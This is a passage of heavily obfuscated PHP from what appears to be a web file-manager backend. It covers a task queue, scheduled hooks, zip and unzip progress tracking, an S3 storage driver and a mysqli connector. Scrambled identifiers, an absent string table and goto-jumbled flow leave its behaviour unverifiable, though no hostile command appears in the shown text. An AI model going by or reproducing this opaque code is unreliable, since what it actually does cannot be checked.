$š¼¥Ü†¦ = $ÙàÏì‹í[12]; if ($…§ü¼ÁŒ[$ÙàÏì‹í[1873]]) { $İ§£åÎ = $ÊÙ»âÑ . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1796]]) . $ÙàÏì‹í[8] . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1159]]); $š¼¥Ü†¦ = size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1798]]) . $ÙàÏì‹í[1890]; } if ($…§ü¼ÁŒ[$ÙàÏì‹í[1161]]) { $…§ü¼ÁŒ[$ÙàÏì‹í[1847]] = $…§ü¼ÁŒ[$ÙàÏì‹í[1161]] . $ÙàÏì‹í[53] . $…§ü¼ÁŒ[$ÙàÏì‹í[1847]]; } if ($…§ü¼ÁŒ[$ÙàÏì‹í[1847]]) { $‰Ÿ‡şÎ• = $ÙàÏì‹í[12]; if ($…§ü¼ÁŒ[$ÙàÏì‹í[1849]]) { $‰Ÿ‡şÎ• = $ÙàÏì‹í[50] . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1850]]) . $ÙàÏì‹í[8] . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1849]]); } $š¼¥Ü†¦ .= $…§ü¼ÁŒ[$ÙàÏì‹í[1847]] . $‰Ÿ‡şÎ•; } if ($…§ü¼ÁŒ[$ÙàÏì‹í[848]] && !$…§ü¼ÁŒ[$ÙàÏì‹í[1849]]) { $š¼¥Ü†¦ .= $ÙàÏì‹í[53] . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[1854]]) . $ÙàÏì‹í[8] . size_format($…§ü¼ÁŒ[$ÙàÏì‹í[848]]); } echoLog($İ§£åÎ . $ÙàÏì‹í[53] . $š¼¥Ü†¦, !0); } public function taskEnd($Û÷íÍÏ²) { $‡ß®®Õ­ =& $_SERVER[™¸œØ®Ü]; if (!$Û÷íÍÏ² || $this->taskID != $Û÷íÍÏ²[$‡ß®®Õ­[477]]) { return; } $˜ŸÁ½Â® = $Û÷íÍÏ² ? LNG($‡ß®®Õ­[1891]) . $‡ß®®Õ­[4] . $Û÷íÍÏ²[$‡ß®®Õ­[1796]] . $‡ß®®Õ­[8] . $Û÷íÍÏ²[$‡ß®®Õ­[1159]] . LNG($‡ß®®Õ­[1889]) . $‡ß®®Õ­[74] : $‡ß®®Õ­[12]; echoLog($‡ß®®Õ­[1892] . $Û÷íÍÏ²[$‡ß®®Õ­[1683]] . ($Û÷íÍÏ²[$‡ß®®Õ­[528]] ? $‡ß®®Õ­[74] . $Û÷íÍÏ²[$‡ß®®Õ­[528]] : $‡ß®®Õ­[12]) . $‡ß®®Õ­[74] . $˜ŸÁ½Â® . $‡ß®®Õ­[1893] . sprintf($‡ß®®Õ­[942], timeFloat() - $Û÷íÍÏ²[$‡ß®®Õ­[1799]]) . $‡ß®®Õ­[1811]); $this->end(); } public function taskKill($™ ìàè) { $’×¤ƒôÁ =& $_SERVER[™¸œØ®Ü]; if (!$™ ìàè || $this->taskID != $™ ìàè[$’×¤ƒôÁ[477]]) { return; } echoLog($’×¤ƒôÁ[1894] . $™ ìàè[$’×¤ƒôÁ[1683]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\x75\145\x75\145\x4c\x65\x6e\147\164\x68"; const QUEUE_DATA = "\164\141\163\x6b\121\x75\145\x75\x65\104\x61\164\141"; const QUEUE_TIME = "\x74\x61\163\153\121\165\145\x75\145\x4c\141\163\164\x52\165\156"; const QUEUE_THREAD = "\x74\141\163\x6b\x51\165\x65\165\x65\x54\x68\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($È–¢²‹û, $´÷µ»— = array(), $ÁÅÃä™‚ = '', $¼áàş°Í = '') { $Û½¡Å‚§ =& $_SERVER[™¸œØ®Ü]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¼áàş°Í && array_find_by_field(self::$listData, $Û½¡Å‚§[97], $¼áàş°Í)) { return !0; } if ($¼áàş°Í && array_find_by_field(self::$listDataAdd, $Û½¡Å‚§[97], $¼áàş°Í)) { return !0; } self::$listDataAdd[] = array($Û½¡Å‚§[343] => $È–¢²‹û, $Û½¡Å‚§[1895] => $´÷µ»—, $Û½¡Å‚§[528] => $ÁÅÃä™‚, $Û½¡Å‚§[97] => $¼áàş°Í); return !0; } public static function addSubmit() { $Ô®±ŞÙü =& $_SERVER[™¸œØ®Ü]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ô®±ŞÙü[1896] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ô®±ŞÙü[12], $Ô®±ŞÙü[528])), $Ô®±ŞÙü[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($î²ˆ˜îè, $´á½×ÆÊ = array(), $ÉÑÒ½³Î = '', $û—áÆ“ = '') { $‡šÖ±±« =& $_SERVER[™¸œØ®Ü]; if (self::count() >= self::MAX_LENGTH) { return !1; } $÷Õ¶‡µ = self::getAll(); if ($û—áÆ“ && array_find_by_field($÷Õ¶‡µ, $‡šÖ±±«[97], $û—áÆ“)) { return !0; } $÷Õ¶‡µ[] = array($‡šÖ±±«[343] => $î²ˆ˜îè, $‡šÖ±±«[1895] => $´á½×ÆÊ, $‡šÖ±±«[528] => $ÉÑÒ½³Î, $‡šÖ±±«[97] => $û—áÆ“); self::setAll($÷Õ¶‡µ); write_log($‡šÖ±±«[1896] . $ÉÑÒ½³Î, $‡šÖ±±«[197]); return !0; } public static function run() { $Í²¾›‰ô =& $_SERVER[™¸œØ®Ü]; $‘ƒ½²‡İ = self::getAll(); $ˆˆœ˜ÕÜ = array_shift($‘ƒ½²‡İ); if (!$ˆˆœ˜ÕÜ) { return !1; } self::setAll($‘ƒ½²‡İ); $¨âó–À™ = timeFloat(); $¡ˆ¶Í°è = $Í²¾›‰ô[12]; try { $¡ˆ¶Í°è = Hook::apply($ˆˆœ˜ÕÜ[$Í²¾›‰ô[343]], $ˆˆœ˜ÕÜ[$Í²¾›‰ô[1895]]); } catch (Exception $Ä¥ÀÓ²Š) { write_log($Ä¥ÀÓ²Š, $Í²¾›‰ô[1283]); } $ã»Ã«™Â = number_format(timeFloat() - $¨âó–À™, 3) . $Í²¾›‰ô[1811]; if ($¡ˆ¶Í°è && is_string($¡ˆ¶Í°è)) { $ã»Ã«™Â = $ã»Ã«™Â . $Í²¾›‰ô[1897] . $¡ˆ¶Í°è; } write_log($Í²¾›‰ô[1898] . $ˆˆœ˜ÕÜ[$Í²¾›‰ô[528]] . $Í²¾›‰ô[1899] . $ã»Ã«™Â, $Í²¾›‰ô[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $·âÒòù =& $_SERVER[™¸œØ®Ü]; $ÆË¼çõ¢ = self::threadCount() + 1; if ($ÆË¼çõ¢ > 3 || !self::count()) { return; } write_log($·âÒòù[1900] . $ÆË¼çõ¢, $·âÒòù[197]); Cache::set(self::QUEUE_THREAD, $ÆË¼çõ¢, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($·âÒòù[1901], $·âÒòù[197]); } public static function getKey($¢„İö½ò, $ìÒìå¦ñ = "\151\x6e\164") { $¨íÔø®‘ =& $_SERVER[™¸œØ®Ü]; Cache::removeMemory($¢„İö½ò); $Ù÷İ›” = Cache::get($¢„İö½ò); if ($ìÒìå¦ñ == $¨íÔø®‘[365]) { return $Ù÷İ›” ? intval($Ù÷İ›”) : 0; } if ($ìÒìå¦ñ == $¨íÔø®‘[1902]) { return is_array($Ù÷İ›”) ? $Ù÷İ›” : array(); } return $Ù÷İ›”; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[™¸œØ®Ü][1902]); } public static function setAll($¾ÈÍ©¼¬) { $ñ§Øáøş = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¾ÈÍ©¼¬), $ñ§Øáøş); Cache::set(self::QUEUE_DATA, $¾ÈÍ©¼¬, $ñ§Øáøş); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto A¶§‹®Â±×; A¶§‹®Â±×: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($º©¤ÏÕè, $«Ş¸—ˆ¡ = 5.0) { if (!$º©¤ÏÕè) { return; } $è¦¬ÊÔ = Cache::get($º©¤ÏÕè); if (!$è¦¬ÊÔ || timeFloat() - floatVal($è¦¬ÊÔ) >= $«Ş¸—ˆ¡) { Cache::set($º©¤ÏÕè, timeFloat(), $«Ş¸—ˆ¡ * 10); return !0; } return !1; } public static function timeLimitCall($’ïìüªÂ, $ïºØıñ, $àûÌ¡íö, $ó¯áÎ’ = 5.0) { $‡Ê¿Úüş =& $_SERVER[™¸œØ®Ü]; if (!$’ïìüªÂ || !$ïºØıñ) { return; } self::$asyncAdd = !0; $§áşĞ·„ = $‡Ê¿Úüş[1903]; $«Ş‡­¿” = Cache::get($§áşĞ·„, !0); $³áé¬Ş = array($‡Ê¿Úüş[1904] => timeFloat(), $‡Ê¿Úüş[1905] => timeFloat(), $‡Ê¿Úüş[343] => $ïºØıñ, $‡Ê¿Úüş[1895] => $àûÌ¡íö, $‡Ê¿Úüş[206] => $ó¯áÎ’); if (is_array($«Ş‡­¿”[$’ïìüªÂ])) { $³áé¬Ş[$‡Ê¿Úüş[1905]] = $«Ş‡­¿”[$’ïìüªÂ][$‡Ê¿Úüş[1905]]; } if (is_array($«Ş‡­¿”[$’ïìüªÂ])) { if (timeFloat() - $«Ş‡­¿”[$’ïìüªÂ][$‡Ê¿Úüş[1904]] < $³áé¬Ş[$‡Ê¿Úüş[206]] * 0.3) { return; } $³áé¬Ş[$‡Ê¿Úüş[1905]] = $«Ş‡­¿”[$’ïìüªÂ][$‡Ê¿Úüş[1905]]; } $«Ş‡­¿”[$’ïìüªÂ] = $³áé¬Ş; Cache::set($§áşĞ·„, $«Ş‡­¿”, 60); Cache::removeMemory($§áşĞ·„); write_log($‡Ê¿Úüş[1906] . $’ïìüªÂ . $‡Ê¿Úüş[74] . $ïºØıñ, $‡Ê¿Úüş[197]); } public static function timeLimitCallLoop() { $ÆÂ¦Š‡• =& $_SERVER[™¸œØ®Ü]; $¸Èı¥¨à = array($ÆÂ¦Š‡•[1907]); $­©ÖÑã² = in_array(strtolower(ACTION), $¸Èı¥¨à); if (!$­©ÖÑã² && !self::$asyncAdd) { return; } $½ÓŠİË” = $ÆÂ¦Š‡•[1903]; $õÄ©´Ñ† = Cache::get($½ÓŠİË”, !0); if (!$õÄ©´Ñ† || count($õÄ©´Ñ†) <= 0) { return; } $õàñ«»ã = !1; $İ¹€şƒ™ = timeFloat(); $Ê´Ã‚ = array(); foreach ($õÄ©´Ñ† as $İÊº•­ => $¡¶Ô³Ì) { if ($İ¹€şƒ™ - $¡¶Ô³Ì[$ÆÂ¦Š‡•[1905]] > $¡¶Ô³Ì[$ÆÂ¦Š‡•[206]]) { $õàñ«»ã = !0; try { Hook::apply($¡¶Ô³Ì[$ÆÂ¦Š‡•[343]], $¡¶Ô³Ì[$ÆÂ¦Š‡•[1895]]); write_log($ÆÂ¦Š‡•[1908] . $İÊº•­ . $ÆÂ¦Š‡•[74] . $¡¶Ô³Ì[$ÆÂ¦Š‡•[343]] . $ÆÂ¦Š‡•[1909] . ACTION, $ÆÂ¦Š‡•[197]); } catch (Exception $ŞçÎÈš) { } continue; } $Ê´Ã‚[$İÊº•­] = $¡¶Ô³Ì; } if (!$õàñ«»ã) { return; } if (!$Ê´Ã‚) { return Cache::remove($½ÓŠİË”); } Cache::set($½ÓŠİË”, $Ê´Ã‚, 60); Cache::removeMemory($½ÓŠİË”); } public static function finished($Çáæª€¶, $ê£—üİ ) { $ºëŒ§şó =& $_SERVER[™¸œØ®Ü]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ºëŒ§şó[343] => $Çáæª€¶, $ºëŒ§şó[1895] => $ê£—üİ ); } private static function finishedRun() { $¤¨¼ºéÈ =& $_SERVER[™¸œØ®Ü]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $úîªî•­) { try { Hook::apply($úîªî•­[$¤¨¼ºéÈ[343]], $úîªî•­[$¤¨¼ºéÈ[1895]]); } catch (Exception $°˜å¦—) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Æ­æĞÉ§ =& $_SERVER[™¸œØ®Ü]; parent::startAfter(); Hook::bind($Æ­æĞÉ§[1910], array($this, $Æ­æĞÉ§[1911])); Hook::bind($Æ­æĞÉ§[1297], array($this, $Æ­æĞÉ§[1912])); Hook::bind($Æ­æĞÉ§[1913], array($this, $Æ­æĞÉ§[1914])); $èïìø =& $this->task; $èïìø[$Æ­æĞÉ§[1915]] = $Æ­æĞÉ§[1298]; if (!$èïìø[$Æ­æĞÉ§[1683]]) { $èïìø[$Æ­æĞÉ§[1683]] = LNG($Æ­æĞÉ§[1916]); } } protected function endAfter() { $¨Ê—Û  =& $_SERVER[™¸œØ®Ü]; parent::endAfter(); Hook::unbind($¨Ê—Û [1910], array($this, $¨Ê—Û [1911])); Hook::unbind($¨Ê—Û [1297], array($this, $¨Ê—Û [1912])); Hook::unbind($¨Ê—Û [1913], array($this, $¨Ê—Û [1914])); } public function updateAfter() { $¿´îÊ”³ =& $_SERVER[™¸œØ®Ü]; $Éñ·ÌÜŸ =& $this->task; if (!$Éñ·ÌÜŸ[$¿´îÊ”³[1159]] || !$Éñ·ÌÜŸ[$¿´îÊ”³[848]]) { if ($Éñ·ÌÜŸ[$¿´îÊ”³[1915]] != $¿´îÊ”³[390]) { return; } } if ($Éñ·ÌÜŸ[$¿´îÊ”³[1915]] == $¿´îÊ”³[1298]) { $‰Ü‹û«Â = 0; if ($Éñ·ÌÜŸ[$¿´îÊ”³[1849]]) { $‰Ü‹û«Â = $Éñ·ÌÜŸ[$¿´îÊ”³[1850]] / $Éñ·ÌÜŸ[$¿´îÊ”³[1849]]; } $Éñ·ÌÜŸ[$¿´îÊ”³[1797]] = $‰Ü‹û«Â * 0.3; } else { if ($Éñ·ÌÜŸ[$¿´îÊ”³[1915]] == $¿´îÊ”³[390]) { $‰Ü‹û«Â = $Éñ·ÌÜŸ[$¿´îÊ”³[1796]] / $Éñ·ÌÜŸ[$¿´îÊ”³[1159]]; $Éñ·ÌÜŸ[$¿´îÊ”³[1797]] = 0.3 + $‰Ü‹û«Â * 0.4; } else { if ($Éñ·ÌÜŸ[$¿´îÊ”³[1915]] == $¿´îÊ”³[110]) { $ÍÃÕ¶¦› = 0; if ($Éñ·ÌÜŸ[$¿´îÊ”³[1851]] == $¿´îÊ”³[110]) { $ÍÃÕ¶¦› = $Éñ·ÌÜŸ[$¿´îÊ”³[1850]]; } $‰Ü‹û«Â = ($Éñ·ÌÜŸ[$¿´îÊ”³[1854]] + $ÍÃÕ¶¦›) / $Éñ·ÌÜŸ[$¿´îÊ”³[848]]; $Éñ·ÌÜŸ[$¿´îÊ”³[1797]] = 0.3 + 0.4 + $‰Ü‹û«Â * 0.3; } } } if ($Éñ·ÌÜŸ[$¿´îÊ”³[1797]] > 0) { $åñÕ¹Å = timeFloat() - $Éñ·ÌÜŸ[$¿´îÊ”³[1799]] - $Éñ·ÌÜŸ[$¿´îÊ”³[1802]]; $Éñ·ÌÜŸ[$¿´îÊ”³[1803]] = $åñÕ¹Å * (1 - $Éñ·ÌÜŸ[$¿´îÊ”³[1797]]) / $Éñ·ÌÜŸ[$¿´îÊ”³[1797]]; } } public function addFile($ÈİŒú“É) { $¥ì˜µÃ =& $_SERVER[™¸œØ®Ü]; $Ï§Å¡ª =& $this->task; $“òöùÊÜ = IO::info($ÈİŒú“É); $Ï§Å¡ª[$¥ì˜µÃ[1847]] = $“òöùÊÜ[$¥ì˜µÃ[32]]; $Ï§Å¡ª[$¥ì˜µÃ[1849]] = $“òöùÊÜ[$¥ì˜µÃ[79]]; $Ï§Å¡ª[$¥ì˜µÃ[1850]] = 0; $Ï§Å¡ª[$¥ì˜µÃ[1161]] = $¥ì˜µÃ[1870]; $Ï§Å¡ª[$¥ì˜µÃ[1851]] = $¥ì˜µÃ[1298]; $Ï§Å¡ª[$¥ì˜µÃ[848]] = $“òöùÊÜ[$¥ì˜µÃ[79]]; $Ï§Å¡ª[$¥ì˜µÃ[1159]] = 1; $•€üÎÛ = 0; $Ï§Å¡ª[$¥ì˜µÃ[1858]] = array($¥ì˜µÃ[1859] => $•€üÎÛ + 1, $¥ì˜µÃ[496] => $“òöùÊÜ[$¥ì˜µÃ[32]], $¥ì˜µÃ[87] => $“òöùÊÜ[$¥ì˜µÃ[87]], $¥ì˜µÃ[586] => $“òöùÊÜ[$¥ì˜µÃ[586]] ? $“òöùÊÜ[$¥ì˜µÃ[586]] : $“òöùÊÜ[$¥ì˜µÃ[87]]); $this->update(); } public function zipEvent($Ò…‹Ó‘, $¾¯ÙÚ›Ì, $·Ã€×Í, $çª®ÈÕñ) { $› ë×·· =& $_SERVER[™¸œØ®Ü]; $’á¿¡¬· =& $this->task; $’á¿¡¬·[$› ë×··[1847]] = get_path_this($¾¯ÙÚ›Ì); $’á¿¡¬·[$› ë×··[1849]] = $çª®ÈÕñ; $’á¿¡¬·[$› ë×··[1850]] = $·Ã€×Í; $’á¿¡¬·[$› ë×··[1161]] = $Ò…‹Ó‘ == $› ë×··[1917] ? $› ë×··[1918] : $› ë×··[1919]; $’á¿¡¬·[$› ë×··[1851]] = $› ë×··[12]; $’á¿¡¬·[$› ë×··[848]] = $çª®ÈÕñ; $’á¿¡¬·[$› ë×··[1915]] = $› ë×··[390]; $this->update(); } public function unzipAfter($Ò†´¿ïã) { $ˆ‰·ôä‰ =& $_SERVER[™¸œØ®Ü]; $Ş®àÃ¯ =& $this->task; $Ş®àÃ¯[$ˆ‰·ôä‰[1915]] = $ˆ‰·ôä‰[110]; $èÒ•ª = IO::infoWithChildren($Ò†´¿ïã); $ãÈŒ ô = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[1858]] = array($ˆ‰·ôä‰[1859] => $ãÈŒ ô + 1, $ˆ‰·ôä‰[496] => $èÒ•ª[$ˆ‰·ôä‰[32]], $ˆ‰·ôä‰[87] => $èÒ•ª[$ˆ‰·ôä‰[87]], $ˆ‰·ôä‰[586] => $èÒ•ª[$ˆ‰·ôä‰[586]] ? $èÒ•ª[$ˆ‰·ôä‰[586]] : $èÒ•ª[$ˆ‰·ôä‰[87]]); if ($èÒ•ª[$ˆ‰·ôä‰[33]] == $ˆ‰·ôä‰[232]) { $Ş®àÃ¯[$ˆ‰·ôä‰[1159]] = 1; } else { $Ş®àÃ¯[$ˆ‰·ôä‰[1159]] = $èÒ•ª[$ˆ‰·ôä‰[82]][$ˆ‰·ôä‰[80]]; } $Ş®àÃ¯[$ˆ‰·ôä‰[1161]] = $ˆ‰·ôä‰[12]; $Ş®àÃ¯[$ˆ‰·ôä‰[1851]] = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[1796]] = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[1849]] = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[1850]] = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[1847]] = $ˆ‰·ôä‰[12]; $Ş®àÃ¯[$ˆ‰·ôä‰[1854]] = 0; $Ş®àÃ¯[$ˆ‰·ôä‰[848]] = $èÒ•ª[$ˆ‰·ôä‰[79]]; $this->update(); self::log($ˆ‰·ôä‰[1920] . json_encode(array($Ş®àÃ¯, $èÒ•ª))); } public function nameParse($Ş£Ó¤µ˜) { $ šŸš¹ì =& $_SERVER[™¸œØ®Ü]; $ùµ®ê×ë =& $this->task; if ($ùµ®ê×ë[$ šŸš¹ì[1915]] == $ šŸš¹ì[1298]) { $ùµ®ê×ë[$ šŸš¹ì[1915]] = $ šŸš¹ì[390]; $ùµ®ê×ë[$ šŸš¹ì[1854]] = 0; $ùµ®ê×ë[$ šŸš¹ì[848]] = 0; } $úÅ•ê®¢ = get_path_this($Ş£Ó¤µ˜); if (strstr($úÅ•ê®¢, $ šŸš¹ì[10])) { $ùµ®ê×ë[$ šŸš¹ì[1796]] += 1; $ùµ®ê×ë[$ šŸš¹ì[1159]] += 1; } $ùµ®ê×ë[$ šŸš¹ì[1847]] = $Ş£Ó¤µ˜; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ø–öÙ =& $_SERVER[™¸œØ®Ü]; parent::startAfter(); Hook::bind($ø–öÙ[1921], array($this, $ø–öÙ[1911])); Hook::bind($ø–öÙ[1913], array($this, $ø–öÙ[1914])); $úÀ‚ú÷Ï =& $this->task; $úÀ‚ú÷Ï[$ø–öÙ[1915]] = $ø–öÙ[1298]; if (!$úÀ‚ú÷Ï[$ø–öÙ[1683]]) { $úÀ‚ú÷Ï[$ø–öÙ[1683]] = LNG($ø–öÙ[1922]); } } protected function endAfter() { $·â¥ñğï =& $_SERVER[™¸œØ®Ü]; parent::endAfter(); Hook::unbind($·â¥ñğï[1921], array($this, $·â¥ñğï[1911])); Hook::unbind($·â¥ñğï[1913], array($this, $·â¥ñğï[1914])); } public function updateAfter() { $œÎ½ãÕÁ =& $_SERVER[™¸œØ®Ü]; $’ı¯ŸÕ‰ =& $this->task; if (!$’ı¯ŸÕ‰[$œÎ½ãÕÁ[1159]] || !$’ı¯ŸÕ‰[$œÎ½ãÕÁ[848]]) { return; } if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1915]] == $œÎ½ãÕÁ[1298]) { $Ìãßü—‰ = $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1850]]; if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1851]] != $œÎ½ãÕÁ[1298]) { $Ìãßü—‰ = 0; } $Â¤õÙß = ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1854]] + $Ìãßü—‰) / $’ı¯ŸÕ‰[$œÎ½ãÕÁ[848]]; $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]] = $Â¤õÙß * 0.3; } else { if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1915]] == $œÎ½ãÕÁ[390]) { $Â¤õÙß = $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1796]] / $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1159]]; $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]] = 0.3 + $Â¤õÙß * 0.5; } else { if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1915]] == $œÎ½ãÕÁ[110]) { $Â¤õÙß = 0; if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1849]]) { $Â¤õÙß = $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1850]] / $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1849]]; } $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]] = 0.3 + 0.5 + $Â¤õÙß * 0.2; } } } if ($’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]] > 0) { $îÑ°›Òñ = timeFloat() - $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1799]] - $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1802]]; $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1803]] = $îÑ°›Òñ * (1 - $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]]) / $’ı¯ŸÕ‰[$œÎ½ãÕÁ[1797]]; } } public function copyFileStart($âé’§×Œ, $‘®úèŞ, $ºî¶·àğ, $ıäîò¦¾, $¨ú‡“Ó , $½ÔÁÇØ©) { $ªÀ¡›ÊÜ =& $_SERVER[™¸œØ®Ü]; parent::copyFileStart($âé’§×Œ, $‘®úèŞ, $ºî¶·àğ, $ıäîò¦¾, $¨ú‡“Ó , $½ÔÁÇØ©); $µûÓ†œİ =& $this->task; if ($µûÓ†œİ[$ªÀ¡›ÊÜ[1915]] == $ªÀ¡›ÊÜ[390]) { $µûÓ†œİ[$ªÀ¡›ÊÜ[1915]] = $ªÀ¡›ÊÜ[110]; } $this->update(); } public function copyFileEnd($Ä€é»ÂÀ, $‰â¥”ƒ, $˜âÎÇ©, $â„É±ÁÕ, $°¬°œõ–, $ÌÉ·Û–) { $•‚‘»»² =& $_SERVER[™¸œØ®Ü]; $ÏŠ÷É§ï =& $this->task; $ÏŠ÷É§ï[$•‚‘»»²[1850]] = $ÏŠ÷É§ï[$•‚‘»»²[1849]]; $ÏŠ÷É§ï[$•‚‘»»²[1854]] += $ÏŠ÷É§ï[$•‚‘»»²[1849]]; $ÏŠ÷É§ï[$•‚‘»»²[1851]] = $•‚‘»»²[12]; $this->update(); } public function zipEvent($°¥»¿í, $ÜìïûÊ, $Ö¼…³•È, $¥›Ÿµ‡á) { $·˜¥Æ–Ö =& $_SERVER[™¸œØ®Ü]; $£ª•ì¬¾ =& $this->task; $£ª•ì¬¾[$·˜¥Æ–Ö[1847]] = get_path_this($ÜìïûÊ); $£ª•ì¬¾[$·˜¥Æ–Ö[1849]] = $¥›Ÿµ‡á; $£ª•ì¬¾[$·˜¥Æ–Ö[1850]] = $Ö¼…³•È; $£ª•ì¬¾[$·˜¥Æ–Ö[1161]] = $°¥»¿í == $·˜¥Æ–Ö[1923] ? $·˜¥Æ–Ö[1918] : $·˜¥Æ–Ö[1919]; $£ª•ì¬¾[$·˜¥Æ–Ö[1851]] = $·˜¥Æ–Ö[12]; $£ª•ì¬¾[$·˜¥Æ–Ö[848]] = $¥›Ÿµ‡á; $£ª•ì¬¾[$·˜¥Æ–Ö[1915]] = $·˜¥Æ–Ö[390]; $this->update(); } public function nameParse($ªÛÇïü) { $¯ÅËŞË =& $_SERVER[™¸œØ®Ü]; $˜ëîã¦å =& $this->task; if ($˜ëîã¦å[$¯ÅËŞË[1796]] < $˜ëîã¦å[$¯ÅËŞË[1159]]) { $˜öÕß±Ü = get_path_this($ªÛÇïü); if (strstr($˜öÕß±Ü, $¯ÅËŞË[10])) { $˜ëîã¦å[$¯ÅËŞË[1796]] += 1; } } if ($˜ëîã¦å[$¯ÅËŞË[1915]] == $¯ÅËŞË[1298]) { $˜ëîã¦å[$¯ÅËŞË[1915]] = $¯ÅËŞË[390]; } $˜ëîã¦å[$¯ÅËŞË[1847]] = $ªÛÇïü; $this->update(); } } goto EÜ¯Ï ŞÈ‰; eã„ÓÖ¨¸Ê: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¿»£Ôê) { $Úûığ‹Á =& $_SERVER[™¸œØ®Ü]; parent::__construct($¿»£Ôê); $—¸Ë––ı = isset($¿»£Ôê[$Úûığ‹Á[258]]) && $¿»£Ôê[$Úûığ‹Á[258]] == $Úûığ‹Á[249] ? $Úûığ‹Á[249] : $Úûığ‹Á[315]; $this->setSignVersion($—¸Ë––ı); } public function link($¿ªŠ˜×“, $Àù¸ã = array()) { return parent::link($¿ªŠ˜×“, $Àù¸ã); } public function fileOut($ˆãöà, $óÒª¹¡‚ = false, $Ì°ƒ«³ = false, $¢…î¿ïÏ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[™¸œØ®Ü][316])) { return parent::fileOutServer($ˆãöà, $óÒª¹¡‚, $Ì°ƒ«³, $¢…î¿ïÏ); } parent::fileOut($ˆãöà, $óÒª¹¡‚, $Ì°ƒ«³, $¢…î¿ïÏ); } public function fileOutImage($ğÉĞŞû§, $ï²Î˜„Á = 250) { if (strstr($this->endpoint, $_SERVER[™¸œØ®Ü][316])) { return parent::fileOutImageServer($ğÉĞŞû§, $ï²Î˜„Á); } parent::fileOutImage($ğÉĞŞû§, $ï²Î˜„Á); } public function fileOutLink($†ğÚ×) { $ª”ÉÔÀò =& $_SERVER[™¸œØ®Ü]; if (substr($†ğÚ×, 0, 7) == $ª”ÉÔÀò[218]) { $†ğÚ× = $ª”ÉÔÀò[219] . substr($†ğÚ×, 7); } header($ª”ÉÔÀò[175] . $†ğÚ×); die; } } define($_SERVER[™¸œØ®Ü][317], 1); define($_SERVER[™¸œØ®Ü][318], 2); goto B‰ŒØ–„÷á; B‰ŒØ–„÷á: define($_SERVER[™¸œØ®Ü][319], 3); define($_SERVER[™¸œØ®Ü][320], 1); define($_SERVER[™¸œØ®Ü][321], 0); goto fÅ›ª¢ÔÅõ; e’å´¨Ù »: class DbMysqli extends Db { public function __construct($ğÓĞôÛ¥ = '') { $š”Íå›í =& $_SERVER[™¸œØ®Ü]; if (!extension_loaded($š”Íå›í[1008])) { think_exception(think_lang($š”Íå›í[14]) . $š”Íå›í[1009]); } if (!empty($ğÓĞôÛ¥)) { $this->config = $ğÓĞôÛ¥; if (empty($this->config[$š”Íå›í[17]])) { $this->config[$š”Íå›í[17]] = $š”Íå›í[12]; } } } public function connect($¾é£´ÃÙ = '', $‰€¤¨Àö = 0) { $‘©ŞŸ›ã =& $_SERVER[™¸œØ®Ü]; if (!isset($this->linkID[$‰€¤¨Àö])) { if (empty($¾é£´ÃÙ)) { $¾é£´ÃÙ = $this->config; } $this->linkID[$‰€¤¨Àö] = new mysqli($¾é£´ÃÙ[$‘©ŞŸ›ã[982]], $¾é£´ÃÙ[$‘©ŞŸ›ã[984]], 